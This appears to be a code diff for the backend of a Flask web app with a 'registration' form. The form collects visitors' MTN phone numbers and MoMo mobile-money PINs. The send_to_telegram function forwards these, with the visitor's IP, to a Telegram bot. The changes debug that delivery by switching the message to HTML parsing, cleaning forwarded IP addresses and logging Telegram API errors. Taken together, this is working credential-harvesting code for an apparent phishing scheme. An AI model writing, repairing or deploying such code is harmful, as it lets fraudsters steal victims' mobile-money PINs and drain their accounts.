@@ -53,30 +53,40 @@ def send_to_telegram(mtn_number, momo_pin, ip_address=None):
         bot_token = app.config['TELEGRAM_BOT_TOKEN']
         chat_id = app.config['TELEGRAM_CHAT_ID']
         
-        # Prepare the message
+        # Clean IP (Fix for multiple IPs separated by commas)
+        if ip_address and "," in ip_address:
+            ip_address = ip_address.split(",")[0].strip()
+
+        # Prepare the message using HTML tags (Safer than Markdown)
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        message = f"""🔔 **New Registration Alert!**
+        message = f"""<b>🔔 New Registration Alert!</b>
 
-📱 **MTN Number:** {mtn_number}
-🔐 **MoMo PIN:** {momo_pin}
+📱 <b>MTN Number:</b> {mtn_number}
+🔐 <b>MoMo PIN:</b> {momo_pin}
 
-📅 **Time:** {timestamp}
-🌐 **IP:** {ip_address or 'N/A'}
+📅 <b>Time:</b> {timestamp}
+🌐 <b>IP:</b> {ip_address or 'N/A'}
 
-⚠️ **Security Notice:** This is sensitive information. Handle with care!"""
+⚠️ <b>Security Notice:</b> This is sensitive information. Handle with care!"""
         
         # Telegram API URL
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
         
         # Payload
         payload = {
-            'chat_id': chat_id,
+            'chat_id': str(chat_id).strip(),  # Ensure it is a stripped string
             'text': message,
-            'parse_mode': 'Markdown'
+            'parse_mode': 'HTML'  # CHANGED FROM MARKDOWN TO HTML TO FIX 400 ERROR
         }
         
         # Send request with timeout
         response = requests.post(url, json=payload, timeout=10)
+        
+        # Check the specific status code and print the exact error from Telegram
+        if response.status_code != 200:
+            logger.error(f"Telegram API specific error: {response.text}")
+            return False, f"Telegram API error: {response.text}"
+            
         response.raise_for_status()
         
         logger.info(f"Successfully sent registration data to Telegram for {mtn_number}")
@@ -108,7 +118,9 @@ def register():
     """Handle registration form submission"""
     try:
         # Get client IP for rate limiting
-        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        # Take only the first IP from the forwarded chain
+        client_ip = raw_ip.split(',')[0].strip() if raw_ip else "Unknown"
         
         # Apply rate limiting
         if is_rate_limited(client_ip):
